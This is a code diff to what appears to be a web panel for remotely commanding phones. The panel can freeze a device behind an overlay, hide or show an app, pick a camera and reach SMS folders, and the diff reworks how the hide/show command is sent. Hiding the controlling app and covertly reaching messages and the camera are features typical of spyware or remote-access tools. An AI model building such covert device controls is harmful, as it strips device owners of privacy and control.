@@ -984,7 +984,7 @@
             { icon: '❄️', name: 'Freeze', action: 'freeze', params: { text: 'Device locked by admin' } },
             { icon: '🔥', name: 'Unfreeze', action: 'unfreeze' },
             { icon: '✏️', name: 'Update Overlay', action: 'update_overlay', params: { text: 'New message' } },
-            { icon: '👁️', name: 'Show/Hide App', action: 'show_hide_app', isHideShow: true },
+            { icon: '👁️', name: 'Show/Hide App', action: 'hide_app', isHideShow: true },
             { icon: '🗺️', name: 'Open Maps', action: 'open_maps', params: { lat: '40.7128', lng: '-74.0060' } },
             { icon: '🚀', name: 'Open App', action: 'open_app', isOpenApp: true },
         ],
@@ -2168,7 +2168,17 @@
 
         if (cmd.isToggle) params.state = document.getElementById('toggleSelect').value;
         if (cmd.isCamera) params.camera = document.getElementById('cameraSelect').value;
-        if (cmd.isHideShow) params.action = document.getElementById('hideShowSelect').value;
+        if (cmd.isHideShow) {
+           const mode = document.getElementById('hideShowSelect').value;
+          
+           if (mode === "hide") {
+               cmd.action = "hide_app";
+               params.action = "hide";
+           } else {
+               cmd.action = "show_app";
+               delete params.action;
+           }
+        }
         if (cmd.hasLimit) { const v = document.getElementById('limitInput').value; if (v) params.limit = v; }
         if (cmd.simSlot) { const v = document.getElementById('simSlotSelect').value; if (v) { params.sim_slot = v; params.sim = v; } }
         if (cmd.isSmsFolder) params.folder = document.getElementById('smsFolderSelect').value;
